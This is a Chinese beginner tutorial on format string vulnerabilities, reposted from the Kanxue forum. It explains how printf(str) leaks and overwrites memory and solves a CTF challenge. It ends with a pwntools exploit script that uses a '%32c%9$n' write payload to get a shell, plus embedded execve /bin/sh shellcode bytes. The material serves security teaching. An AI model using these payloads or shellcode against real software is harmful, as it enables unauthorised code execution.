#  PWN入门-格式化字符串漏洞   
柘狐  看雪学苑   2022-06-07 18:17  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8G8Afib4u3yW6GmribqAjIQ9TxHNPy4kSGRe6INIOtat47PRpQnjwzdAzUNdYsPvicSl5uoJW0ZEJb7A/640?wx_fmt=jpeg "")  
  
本文为看雪论坛优秀文章看雪论坛作者ID：柘狐  
  
  
在我们学习c语言的时候我们就知道在输出或者输入的时候需要使用%s%d等等格式化字符，此处不过多介绍，详情可以去看看c语言的基础知识。  
  
  
此处放出一些常见的格式化字符串函数：  
```
1. #include <stdio.h>
 
2. int printf(const char *format, ...);
3. int fprintf(FILE stream, const char format, ...);
4. int dprintf(int fd, const char *format, ...);
5. int sprintf(char str, const char format, ...);
6. int snprintf(char str, size_t size, const char format, ...);
```  
##   
##   
## 转换指示符号：  
##   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8G8Afib4u3yW6GmribqAjIQ9TDrZWoD8mehTMyAYicP4m0jcUvJLyHbXykSAmcmK7vLWKaUJeUIA1LQg/640?wx_fmt=png "")  
  
## 长度：  
##   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8G8Afib4u3yW6GmribqAjIQ9TDrZWoD8mehTMyAYicP4m0jcUvJLyHbXykSAmcmK7vLWKaUJeUIA1LQg/640?wx_fmt=png "")  
##   
## 示例：  
```
#include <stdio.h>
#include <stdlib.h>
void mian(){
    char *format = "%s";
    char *arg1 ="Hello!I‘m ReStr0!"；
    printf(format,arg1);
}
此处是格式化字符串的使用方式
```  
```
当我们运行它时
printf("%03d.%03d.%03d.%03d", 127,0,0,1);//"127.000.000.001"
2. printf("%.2f", 1.2345); // 1.23
3. printf("%#010x", 3735928559); // 0xdeadbeef
5. printf("%s%n", "01234", &n); // n = 5
```  
  
  
这里拿printf格式化字符举例，在glibc库中它的相关代码如下：![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8G8Afib4u3yW6GmribqAjIQ9TAUXHm0qlZicDxTCIazYE5LfcNvJKlBSsUZzMTkOvOycRWPYEky0gYiaQ/640?wx_fmt=png "")  
  
可以看出它从输出流种会将输出的内容按照我们设置的format进行格式化输出。  
  
## 漏洞产生原因和利用原理  
```
/***
我们在正常的对格式化字符输出时大都使用printf(*format,*arg);
此种形式进行输出，但是部分程序员在开发的使用，为了省事使用了，printf(*format);进行输出
为了方便对比，我将在下面贴出正常和存在格式化字符漏洞的写法。
***/
错误：
#include <stdio.h>
void main(){
    char str[1024];
    scanf(%s,&str);
    printf(%s);
}
 
 
正确：
#include <stdio.h>
void main(){
    char str[1024];
    scanf(%s,&str);
    printf(%s,str);
}
//但是如果我们正常输入字符的情况下，此时两个都是可以正常输出我们需要的字符串，但是当我们将%x作为arg键入后，
//错误的代码会将此处的地址打印出来，通过%n操作符我们可以修改指定地址的数据以达到劫持程序流的目的。
//而且此时因为数据长的很长，我们可以输入很多的格式化字符，来泄露我们需要的地址或者其他信息（canary等）。
//最常见的就是通过格式化字符串漏洞泄露libc进行计算基址，泄露canary 进行bypass或者通过格式化字符串漏洞进行对got表地址某几位的改写。
```  
##   
##   
## CTF题目例子  
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int a; // [rsp+Ch] [rbp-74h] BYREF
  char str[100]; // [rsp+10h] [rbp-70h] BYREF
 
  memset(str, 0, sizeof(str));
  a = 16;
  printf("ReStr0 tell you %p\n", &a);
  __isoc99_scanf("%s", str);
  printf(str);
  if ( a == 32 )
  {
    puts("success");
    system("/bin/sh");
  }
  else
  {
    puts("failure");
  }
  return 0;
}
```  
  
  
这道题目我是用64位进行编译的，我们审计代码得知，题目告诉你a的地址，只要我们通过格式化字符串漏洞修改a的值为32就可以getshell，我们也知道可以通过%x$n+p64(a_addr)修改值，那么我们该如何计算这个偏移x呢？  
##   
## 两张图看懂如何计算偏移  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8G8Afib4u3yW6GmribqAjIQ9Teibl0nDmkGia33VIY2XpBMy4SiaQCAaL1SJZWociaibXdfr7MUBQWeIuMrA/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8G8Afib4u3yW6GmribqAjIQ9TIH6Xy7zRfaERxVwDZ7OZ8hZWxjcV1pdBicCJar3kLjPlSvw6V9ficQ4g/640?wx_fmt=png "")  
  
  
此处我们也可以通过pwndbg自带的fmtarg进行计算。  
  
   
  
首先我们在printf的地方打下断点。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8G8Afib4u3yW6GmribqAjIQ9TQRHs5JEDcibHbJS6e67QzKN5bVdAvKYK12Iic7ia6oMlrUsTQav5bbj1g/640?wx_fmt=png "")  
  
  
然后c运行后在输入出随便输入字符aaaa。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8G8Afib4u3yW6GmribqAjIQ9TF2RK7yEOxhZLJ3HicywAOLcFu1dCdQkQ0H1Z0njV9RSBdoeVVQwOZLw/640?wx_fmt=png "")  
  
  
随后停在因为之前打了断点，在printf出停下，发现aaaa返回地址在0x7fffffffdb90 输入fmtarg 0x7fffffffdb90 即可计算出偏移为8。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8G8Afib4u3yW6GmribqAjIQ9TCYwMZvJQCQm8VWMvR9VRlicEpj1ia5gjOBNZVW3IkHeG2z6WGF3MmZyQ/640?wx_fmt=png "")  
  
  
我们也可以通过上面的两张图方法计算出偏移。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8G8Afib4u3yW6GmribqAjIQ9TdMxIrdzePKiauFOozwPyCDYAIDl1icCZ8iacCtSTBnXtic0aDrovuuFTGg/640?wx_fmt=png "")  
  
  
附上编译好的bin程序和exp。  
  
## binary程序下载地址  
  
  
链接：  
https://pan.baidu.com/s/11VvBozTXEZKs3ownh4grqg  
 <br />  
  
提取码：  
hjtp  
##   
## EXP：  
```
# _*_ coding:utf-8 _*_
from pwn import *
context.log_level = 'debug'
 
p=process("fofo")
#p=remote("123.57.230.48","12342")
 
 
 
 
def debug(addr,PIE=True):
    debug_str = ""
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        for i in addr:
            debug_str+='b *{}\n'.format(hex(text_base+i))
        gdb.attach(p,debug_str)
    else:
        for i in addr:
            debug_str+='b *{}\n'.format(hex(i))
        gdb.attach(p,debug_str)
 
def dbg():
    gdb.attach(p)
#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))        #in case that data is an int
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
it      = lambda                    :p.interactive()
uu32    = lambda data   :u32(data.ljust(4, '\0'))
uu64    = lambda data   :u64(data.ljust(8, '\0'))
bp      = lambda bkp                :pdbg.bp(bkp)
li      = lambda str1,data1         :log.success(str1+'========>'+hex(data1))
 
 
def dbgc(addr):
    gdb.attach(p,"b*" + hex(addr) +"\n c")
 
def lg(s,addr):
    print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
 
sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------
 
ru("0x")
stack = int(r(12),16)
#lg('stack',stack)#print
#log.info(hex(stack))
print hex(stack)
 
pay = "%32c%9$n"+p64(stack)
sl(pay)
sleep(0.1)
it()
```  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8G8Afib4u3yW6GmribqAjIQ9TfoCWUdtX2W2B5r8ibePRwbRM6V4ZWfa93PbDYglw9NqAqzibc5X8aaww/640?wx_fmt=png "")  
  
  
**看雪ID：柘狐**  
  
https://bbs.pediy.com/user-home-906932.htm  
  
*本文由看雪论坛 柘狐 原创，转载请注明来自看雪社区  
  
  
[](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458451191&idx=2&sn=61095ba97ac5637c88bd54d7946cad3a&chksm=b18fcc7d86f8456bbe43a843ae99c3a7c1a0c43fb3bc799afc5bec697824c02d451c601ba709&scene=21#wechat_redirect)  
  
  
**#****往期推荐**  
  
1.[2016腾讯游戏安全技术竞赛题PC第一题](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458451313&idx=1&sn=ed0cb67d52ba54000f55ac84b38ef6f9&chksm=b18fcdfb86f844ed2097d80e0182b4ce8ae3d3c0b226fd61615d004c2eb3b2c55b953c0a41d4&scene=21#wechat_redirect)  
  
  
2.[Android APP漏洞之战——调试与反调试详解](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458451170&idx=1&sn=268d133649c845d8f062866cf94e7c95&chksm=b18fcc6886f8457e2daaa55cdbdd6c39047ae997da3454fa35b8e8ee07da3b450cbae5b32bda&scene=21#wechat_redirect)  
  
  
3.[基于深度学习的恶意软件分类器](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458451191&idx=1&sn=8a86e191c520e2622466a733add748b7&chksm=b18fcc7d86f8456b165ddf6bda8192fbd7f465d3ef23e51fdec7d1085c7fe0e4ddf99baf2c77&scene=21#wechat_redirect)  
  
  
4.[Fuzzm: 针对WebAssembly内存错误的模糊测试](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458451152&idx=2&sn=4abbf7a643b93027529e12442608aca2&chksm=b18fcc5a86f8454cb6051aab6a45751ad736285e3f46e92436edb2b963b46bee27da5e0c9922&scene=21#wechat_redirect)  
  
  
5.[0rays战队2021圣诞校内招新赛题解](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458449944&idx=2&sn=1c51b842fd748e55cbe2cbf80f8371f2&chksm=b18fc89286f84184d536aaa1cad66bce9fb3799ef344b743ab5b3b02e89f2336ab6977cfbe2c&scene=21#wechat_redirect)  
  
  
6.[2022腾讯游戏安全初赛一题解析](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458449720&idx=1&sn=d3e33c568fee745ef1ad6334443c2eac&chksm=b18fc7b286f84ea479599f079963ab9b9e199717629c8d0636cd87341b552823a01f995a18c3&scene=21#wechat_redirect)  
****  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Uia4617poZXP96fGaMPXib13V1bJ52yHq9ycD9Zv3WhiaRb2rKV6wghrNa4VyFR2wibBVNfZt3M5IuUiauQGHvxhQrA/640?wx_fmt=jpeg "")  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicdP7bNEwt8Ew5l2fRJxWETW07MNo7TW5xnw60R9WSwicicxtkCEFicpAlQg/640?wx_fmt=gif "")  
  
**球分享**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicdP7bNEwt8Ew5l2fRJxWETW07MNo7TW5xnw60R9WSwicicxtkCEFicpAlQg/640?wx_fmt=gif "")  
  
**球点赞**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicdP7bNEwt8Ew5l2fRJxWETW07MNo7TW5xnw60R9WSwicicxtkCEFicpAlQg/640?wx_fmt=gif "")  
  
**球在看**  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicd7icG69uHMQX9DaOnSPpTgamYf9cLw1XbJLEGr5Eic62BdV6TRKCjWVSQ/640?wx_fmt=gif "")  
  
点击“阅读原文”，了解更多！  
